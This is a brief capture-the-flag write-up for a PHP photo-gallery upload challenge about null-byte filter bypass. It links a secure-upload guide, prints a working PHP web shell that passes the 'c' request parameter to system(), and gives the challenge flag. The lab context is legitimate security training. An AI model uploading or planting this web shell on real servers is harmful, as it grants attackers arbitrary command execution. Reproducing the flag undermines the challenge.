
##### Challenge Description

Your goal is to hack this photo galery by uploading PHP code.

More info about securing file uploads in PHP :
https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf

###### What is a Null Byte ()


```
<?php
if(isset($_GET['c'])) {
    echo "<pre>"; 
    system($_GET['c']);
    echo "</pre>";
}
?>
```


Flag : YPNchi2NmTwygr2dgCCF